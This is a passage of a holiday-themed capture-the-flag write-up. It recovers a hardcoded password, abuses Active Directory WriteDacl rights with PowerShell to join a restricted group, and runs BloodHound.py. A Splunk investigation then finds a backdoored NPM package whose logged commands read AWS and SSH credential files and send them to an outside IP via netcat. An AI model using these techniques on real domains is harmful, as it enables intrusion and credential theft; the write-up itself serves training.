<p>Let&rsquo;s try to find some hardcoded credentials in those scripts. We can copy the files on the <code>grades</code> host and then <code>grep</code> them:</p>
<div class="box">smb: &gt; prompt OFF<br />
smb: &gt; mget *<br />
smb: &gt; exit</div>
<p>We can search the script for the <code>ConvertTo-SecureString</code> flag which is often used to create a <code>Credential</code> object. We find this string in 12 files with <code>grep -Ri &quot;ConvertTo-SecureString&quot; ./*.ps1</code>. By searching the string <code>elfu.local</code>, we get only one hit in <code>GetProcessInfo.ps1</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$SecStringPassword</span> <span class="p">=</span> <span class="s2">&#34;76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA&#34;</span>
<span class="nv">$aPass</span> <span class="p">=</span> <span class="nv">$SecStringPassword</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-Key</span> <span class="n">2</span><span class="p">,</span><span class="n">3</span><span class="p">,</span><span class="n">1</span><span class="p">,</span><span class="n">6</span><span class="p">,</span><span class="n">2</span><span class="p">,</span><span class="n">8</span><span class="p">,</span><span class="n">9</span><span class="p">,</span><span class="n">9</span><span class="p">,</span><span class="n">4</span><span class="p">,</span><span class="n">3</span><span class="p">,</span><span class="n">4</span><span class="p">,</span><span class="n">5</span><span class="p">,</span><span class="n">6</span><span class="p">,</span><span class="n">8</span><span class="p">,</span><span class="n">7</span><span class="p">,</span><span class="n">7</span>
<span class="nv">$aCred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="p">(</span><span class="s2">&#34;elfu.local\remote_elf&#34;</span><span class="p">,</span> <span class="nv">$aPass</span><span class="p">)</span>
<span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">128</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">53</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">Get-Process</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$aCred</span> <span class="n">-Authentication</span> <span class="n">Negotiate</span>
</code></pre></td></tr></table>
</div>
</div><p>This script only executes <code>Get-Process</code> on the <em>Domain Controller</em> with the user <code>remote_elf</code>. We can get its password with the following commands:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$SecStringPassword</span> <span class="p">=</span> <span class="s2">&#34;76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA&#34;</span>
<span class="nv">$aPass</span> <span class="p">=</span> <span class="nv">$SecStringPassword</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-Key</span> <span class="n">2</span><span class="p">,</span><span class="n">3</span><span class="p">,</span><span class="n">1</span><span class="p">,</span><span class="n">6</span><span class="p">,</span><span class="n">2</span><span class="p">,</span><span class="n">8</span><span class="p">,</span><span class="n">9</span><span class="p">,</span><span class="n">9</span><span class="p">,</span><span class="n">4</span><span class="p">,</span><span class="n">3</span><span class="p">,</span><span class="n">4</span><span class="p">,</span><span class="n">5</span><span class="p">,</span><span class="n">6</span><span class="p">,</span><span class="n">8</span><span class="p">,</span><span class="n">7</span><span class="p">,</span><span class="n">7</span>
<span class="nv">$Ptr</span> <span class="p">=</span> <span class="p">\[</span><span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">Marshal</span><span class="p">\]::</span><span class="n">SecureStringToCoTaskMemUnicode</span><span class="p">(</span><span class="nv">$aPass</span><span class="p">)</span>
<span class="nv">$result</span> <span class="p">=</span> <span class="p">\[</span><span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">Marshal</span><span class="p">\]::</span><span class="n">PtrToStringUni</span><span class="p">(</span><span class="nv">$Ptr</span><span class="p">)</span>
<span class="nv">$result</span>
</code></pre></td></tr></table>
</div>
</div><p>The password is <code>A1d655f7f5d98b10!</code>. This user has still not access to the <code>research_dep</code> share. Let&rsquo;s see if we can get a shell on the <em>Domain Controller</em> as well. For that we can re-use the code found on <em>Chris Davis</em>' <em>GitHub</em> <a href="https://github.com/chrisjd20/hhc21_powershell_snippets">repository</a>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;A1d655f7f5d98b10!&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="p">(</span><span class="s2">&#34;elfu.local\remote_elf&#34;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
<span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">hhc21-windows-dc</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">holidayhack2021</span><span class="p">.</span><span class="n">internal</span> <span class="n">-Credential</span> <span class="nv">$creds</span> <span class="n">-Authentication</span> <span class="n">Negotiate</span>
</code></pre></td></tr></table>
</div>
</div><p>We are in the <code>DC01</code> host! Next step would be to read the <em>DACL</em> of some privileged <em>AD</em> groups to see if we have <code>WriteDacl</code> privileges to add users in it and escalate our privileges. This can be tested with the following commands on the <code>Domain Admins</code> group for instance:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$ADSI</span> <span class="p">=</span> <span class="no">[ADSI]</span><span class="s2">&#34;LDAP://CN=Domain Admins,CN=Users,DC=elfu,DC=local&#34;</span>
<span class="nv">$ADSI</span><span class="p">.</span><span class="n">psbase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">GetAccessRules</span><span class="p">(</span><span class="nv">$true</span><span class="p">,</span><span class="nv">$true</span><span class="p">,</span><span class="no">[Security.Principal.NTAccount]</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Unfortunately, we have no rights other than <code>GenericRead</code>. The same with other groups like <code>Administrators</code> or <code>Enterprise Admins</code>. Let&rsquo;s list the remaining groups to see if we find something else. We can run <code>Get-ADGroup -Filter 'GroupCategory -eq &quot;Security&quot;'</code> and with that we see the following group, that could be used to access the <code>research_dep</code> share!</p>
<div class="box">DistinguishedName : CN=Research Department,CN=Users,DC=elfu,DC=local<br />
GroupCategory     : Security<br />
GroupScope        : Global<br />
Name              : Research Department<br />
ObjectClass       : group<br />
ObjectGUID        : 8dd5ece3-bdc8-4d02-9356-df01fb0e5f3d<br />
SamAccountName    : ResearchDepartment<br />
SID               : S-1-5-21-2037236562-2033616742-1485113978-1108</div>
<p>When checking our <em>DACLs</em> on that group, we have indeed the necessary <code>WriteDacl</code> permission:</p>
<div class="box">ActiveDirectoryRights : WriteDacl<br />
InheritanceType       : None<br />
ObjectType            : 00000000-0000-0000-0000-000000000000<br />
InheritedObjectType   : 00000000-0000-0000-0000-000000000000<br />
ObjectFlags           : None<br />
AccessControlType     : Allow<br />
IdentityReference     : ELFU\remote_elf<br />
IsInherited;          : False<br />
InheritanceFlags      : None<br />
PropagationFlags      : None</div>
<p>So let&rsquo;s add our <em>AD</em> user to the group. We can follow step-by-step the snippets found <a href="https://github.com/chrisjd20/hhc21_powershell_snippets">here</a>. First, we grant our user the <code>GenericAll</code> permission on the group with:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span>
<span class="nv">$ldapConnString</span> <span class="p">=</span> <span class="s2">&#34;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&#34;</span>
<span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;iwtejzjzun&#34;</span>
<span class="nv">$nullGUID</span> <span class="p">=</span> <span class="no">[guid]</span><span class="s1">&#39;00000000-0000-0000-0000-000000000000&#39;</span>
<span class="nv">$propGUID</span> <span class="p">=</span> <span class="no">[guid]</span><span class="s1">&#39;00000000-0000-0000-0000-000000000000&#39;</span>
<span class="nv">$IdentityReference</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">NTAccount</span><span class="p">(</span><span class="s2">&#34;elfu.local\$username&#34;</span><span class="p">)).</span><span class="n">Translate</span><span class="p">(</span><span class="no">[System.Security.Principal.SecurityIdentifier]</span><span class="p">)</span>
<span class="nv">$inheritanceType</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectorySecurityInheritance]</span><span class="p">::</span><span class="n">None</span>
<span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectoryAccessRule</span> <span class="nv">$IdentityReference</span><span class="p">,</span> <span class="p">(</span><span class="no">[System.DirectoryServices.ActiveDirectoryRights]</span> <span class="s2">&#34;GenericAll&#34;</span><span class="p">),</span> <span class="p">(</span><span class="no">[System.Security.AccessControl.AccessControlType]</span> <span class="s2">&#34;Allow&#34;</span><span class="p">),</span> <span class="nv">$propGUID</span><span class="p">,</span> <span class="nv">$inheritanceType</span><span class="p">,</span> <span class="nv">$nullGUID</span>
<span class="nv">$domainDirEntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="nv">$ldapConnString</span>
<span class="nv">$secOptions</span> <span class="p">=</span> <span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">get_Options</span><span class="p">()</span>
<span class="nv">$secOptions</span><span class="p">.</span><span class="n">SecurityMasks</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.SecurityMasks]</span><span class="p">::</span><span class="n">Dacl</span>
<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">RefreshCache</span><span class="p">()</span>
<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">get_ObjectSecurity</span><span class="p">().</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>Then we add our user to the group:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span>
<span class="nv">$ldapConnString</span> <span class="p">=</span> <span class="s2">&#34;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&#34;</span>
<span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;iwtejzjzun&#34;</span>
<span class="nv">$password</span> <span class="p">=</span> <span class="s2">&#34;Lkgbcatah@&#34;</span>
<span class="nv">$domainDirEntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="nv">$ldapConnString</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span>
<span class="nv">$user</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">NTAccount</span><span class="p">(</span><span class="s2">&#34;elfu.local\$username&#34;</span><span class="p">)</span>
<span class="nv">$sid</span><span class="p">=</span><span class="nv">$user</span><span class="p">.</span><span class="n">Translate</span><span class="p">(</span><span class="no">[System.Security.Principal.SecurityIdentifier]</span><span class="p">)</span>
<span class="nv">$b</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="nv">$sid</span><span class="p">.</span><span class="n">BinaryLength</span>
<span class="nv">$sid</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
<span class="nv">$hexSID</span><span class="p">=</span><span class="no">[BitConverter]</span><span class="p">::</span><span class="n">ToString</span><span class="p">(</span><span class="nv">$b</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&#34;LDAP://&lt;SID=$hexSID&gt;&#34;</span><span class="p">)</span>
<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
<span class="nv">$domainDirEntry</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>We can check that our user is part of the group with:</p>
<div class="box">PS C:\Users\remote_elf&gt; net user iwtejzjzun<br />
[&hellip;]<br />
Global Group memberships     *ResearchDepartment   *Domain Users</div>
<p>Let&rsquo;s go back to the <code>grades</code> host and discover what&rsquo;s inside the <code>research_dep</code> share:</p>
<div class="box"><p>PS /home/iwtejzjzun&gt; smbclient \10.128.3.30\research_dep -U elfu\iwtejzjzun<br />
Enter ELFU\iwtejzjzun&rsquo;s password:<br />
Try &ldquo;help&rdquo; to get a list of possible commands.<br />
smb: &gt; dir<br />
  .   D        0  Thu Dec  2 16:39:42 2021<br />
  ..  D        0  Mon Jan  3 08:01:29 2022<br />
  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021</p>
<p>  41089256 blocks of size 1024. 33675296 blocks available</p>
<p>smb: &gt; get SantaSecretToAWonderfulHolidaySeason.pdf</p>
</div>
<p>There is only one <em>PDF</em> file that we can retrieve on our host with <code>scp</code>. We can read the following:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj08_08.webp" alt="SantaSecretToAWonderfulHolidaySeason.pdf" data-caption="SantaSecretToAWonderfulHolidaySeason.pdf" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      SantaSecretToAWonderfulHolidaySeason.pdf
      
        
        
      
    </figcaption>
  
</figure>
<p>Optionally, we could have used <em>Bloodhound</em> to retrieve the <em>AD</em> data. As the collector <em>Sharphound</em> is flagged by the antivirus on the <em>Domain Controller</em> and that it is not running properly from the <code>grade</code> host, a working solution is to use the <em>Python</em> port:</p>
<div class="box"><p># on our box<br />
$ git clone <a href="https://github.com/fox-it/BloodHound.py.git">https://github.com/fox-it/BloodHound.py.git</a><br />
$ scp -P 2222 -r ./BloodHound.py/ <a href="mailto:inmwurtvsq@grades.elfu.org">inmwurtvsq@grades.elfu.org</a>:/home/inmwurtvsq/bloodhound</p>
<p># then on the grade host<br />
$ python3 bloodhound.py -dc hhc21-windows-dc.c.holidayhack2021.internal -d elfu.local -c all -u remote_elf -p A1d655f7f5d98b10! --zip</p>
</div>
<p>We retrieve the <em>ZIP</em> file with <code>scp</code> and load it into our <em>Bloodhound</em> instance. As we can see, there is no path from the user <code>remote_elf</code> to <em>Domain Admin</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj08_09.webp" alt="Bloodhound - Find Shortest Paths to Domain Admins" data-caption="Bloodhound - Find Shortest Paths to Domain Admins" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Bloodhound - Find Shortest Paths to Domain Admins
      
        
        
      
    </figcaption>
  
</figure>
<p>To find what the user <code>remote_elf</code> can control, we have to select it and then select <code>First Degree Object Control</code> to find out it can only alter the <code>Research Department</code> group:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj08_10.webp" alt="Bloodhound - First Degree Object Control" data-caption="Bloodhound - First Degree Object Control" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Bloodhound - First Degree Object Control
      
        
        
      
    </figcaption>
  
</figure>
<div class="notices success" data-title="Objective 8 answer">
  Kindness
</div>
<h3 id="9---splunk">9 - Splunk!</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>3/5</td>
<td>Help <strong>Angel Candysalt</strong> solve the <em>Splunk</em> challenge in <em>Santa</em>&rsquo;s great hall. <strong>Fitzy Shortstack</strong> is in <strong>Santa</strong>&rsquo;s lobby, and he knows a few things about <em>Splunk</em>. What does <strong>Santa</strong> call you when when you complete the analysis?</td>
<td>Great Room</td>
</tr>
</tbody>
</table>
<p>This year again we have a <em>Splunk</em> investigation challenge and as soon as we access the portal we get the following message:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj09_02.webp" alt="Santa&#39;s To-Do List" data-caption="Santa&#39;s To-Do List" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santa&#39;s To-Do List
      
        
        
      
    </figcaption>
  
</figure>
<p>We have to answer to 8 questions. Before starting the investigation, make sure to select the logs timeframe to <code>All time</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q1. Capture the commands <strong>Eddie</strong> ran most often, starting with <code>git</code>. Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use.</div>
<p>We the answer with the following search <code>process=&quot;git*&quot; | top limit=1 process</code>.</p>
<p>Answer: <code>git status</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q2. Looking through the <code>git</code> commands <strong>Eddie</strong> ran, determine the remote repository that he configured as the origin for the <code>partnerapi</code> repo. The correct one!</div>
<p>Adding a remote repository with is usually done with the command <code>git remote add origin</code>. By searching <code>process=&quot;git remote add origin*partnerapi*&quot; | top process</code> we get the following output:</p>
<div class="box">git remote add origin <a href="https://github.com/elfnp3/partnerapi.git">https://github.com/elfnp3/partnerapi.git</a><br />
git remote add origin <a href="mailto:git@github.com">git@github.com</a>:elfnp3/partnerapi.git</div>
<p>Answer: <code>git@github.com:elfnp3/partnerapi.git</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q3. The <code>partnerapi</code> project that <strong>Eddie</strong> worked on uses <em>Docker</em>. Gather the full docker command line that <strong>Eddie</strong> used to start the <code>partnerapi</code> project on his workstation.</div>
<p>The Docker command was probably ran from the project directory. We can use this query <code>CurrentDirectory=&quot;*/partnerapi&quot; CommandLine=&quot;docker*&quot; | top CommandLine</code>. We get only one command.</p>
<p>Answer: <code>docker compose up</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q4. <em>Eddie</em> had been testing automated static application security testing (<em>SAST</em>) in <em>GitHub</em>. Vulnerability reports have been coming into <em>Splunk</em> in <em>JSON</em> format via <em>GitHub</em> webhooks. Search all the events in the main index in <em>Splunk</em> and use the sourcetype field to locate these reports. Determine the <em>URL</em> of the vulnerable <em>GitHub</em> repository that the elves cloned for testing and document it here. You will need to search outside of <em>Splunk</em> (try <em>GitHub</em>) for the original name of the repository.</div>
<p>There is a source type dedicated for <em>Github JSON</em> files called <code>github_json</code>. We can list the cloned repositories with the field <code>repository.clone_url</code>. The search is <code>sourcetype=github_json | top repository.clone_url</code>. We get:</p>
<div class="box"><a href="https://github.com/elfnp3/dvws-node.git">https://github.com/elfnp3/dvws-node.git</a><br />
<a href="https://github.com/elfnp3/partnerapi.git">https://github.com/elfnp3/partnerapi.git</a></div>
<p>If we drill-down to the repository that have alerts by adding the filter <code>alert.html_url=&quot;*&quot;</code> we get only the <code>dvws-node</code> repository. The <em>GitHub</em> page mentions that this is a fork of <code>https://github.com/snoopysecurity/dvws</code> that itself points to a new project name <code>https://github.com/snoopysecurity/dvws-node</code>.</p>
<p>Answer: <code>https://github.com/snoopysecurity/dvws-node</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q5. <em>Santa</em> asked <em>Eddie</em> to add a <em>JavaScript</em> library from <em>NPM</em> to the <code>partnerapi</code> project. Determine the name of the library and record it here for our workshop documentation.</div>
<p>We can simply look for the command line that contain <code>npm install</code> in the <code>partnerapi</code> folder with the filter <code>CurrentDirectory=&quot;*/partnerapi&quot; CommandLine=&quot;*npm install*&quot; | top CommandLine</code>. We get four results:</p>
<div class="box">node /usr/bin/npm install holiday-utils-js<br />
node /usr/bin/npm install<br />
/usr/bin/env node /usr/bin/npm install holiday-utils-js<br />
/usr/bin/env node /usr/bin/npm install</div>
<p>Answer: <code>holiday-utils-js</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q6. Another elf started gathering a baseline of the network activity that <em>Eddie</em> generated. Start with <a href="https://hhc21.bossworkshops.io/en-US/app/SA-hhc/search?q=search%20index%3Dmain%20sourcetype%3Djournald%20source%3DJournald%3AMicrosoft-Windows-Sysmon%2FOperational%20EventCode%3D3%20user%3Deddie%20NOT%20dest_ip%20IN%20(127.0.0.*)%20NOT%20dest_port%20IN%20(22%2C53%2C80%2C443)%20%0A%7C%20stats%20count%20by%20dest_ip%20dest_port&amp;display.page.search.mode=smart&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now">their search</a> and capture the full <code>process_name</code> field of anything that looks suspicious.</div>
<p>The starting point is the following search:</p>
<div class="box">index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=3 user=eddie NOT dest_ip IN (127.0.0.*) NOT dest_port IN (22,53,80,443)<br />
| stats count by dest_ip dest_port</div>
<p>Which gives us 2 suspicious <em>IP</em> addresses: <code>192.30.255.113</code> (destination port 9418) and <code>54.175.69.219</code> (destination port 16842). We can drill-down from the output and select <code>View events</code> for each <em>IP</em> address. The call to the first <em>IP</em> address is done by the <code>git</code> process. However the second <em>IP</em> is more shady because it is called by <em>Netcat</em>!</p>
<p>Answer: <code>/usr/bin/nc.openbsd</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q7. Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these <em>Sysmon</em> events is that Network connection events don&rsquo;t indicate the parent process <em>ID</em>, but Process creation events do! Determine the number of files that were accessed by a related process and record it here.</div>
<p>First lets find the parent process that launched <em>Netcat</em>. <em>Sysmon</em> process creation event code is <em>1</em>. The following search <code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 process_name=&quot;/usr/bin/nc.openbsd&quot;</code> returns only one event. We see that the full command line was <code>nc -q1 54.175.69.219 16842</code> and that the current directory was the folder of the <em>NPM</em> library that was installed <code>/home/eddie/partnerapi/node_modules/holiday-utils-js</code>. So the library was probably backdoored. The parent process is <code>/bin/bash</code> with <em>PID</em> 6788.</p>
<p>The same parent <em>PID</em> has launched another command that can be seen with the following search <code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 ParentProcessId=6788</code>. The command is:</p>
<div class="box">cat /home/eddie/.aws/credentials /home/eddie/.ssh/authorized_keys /home/eddie/.ssh/config /home/eddie/.ssh/eddie /home/eddie/.ssh/eddie.pub /home/eddie/.ssh/known_hosts</div>
<p>The evil process sent the content of those files (if they exist) to the attacker through <em>Netcat</em>.</p>
<p>Answer: <code>6</code>.</p>
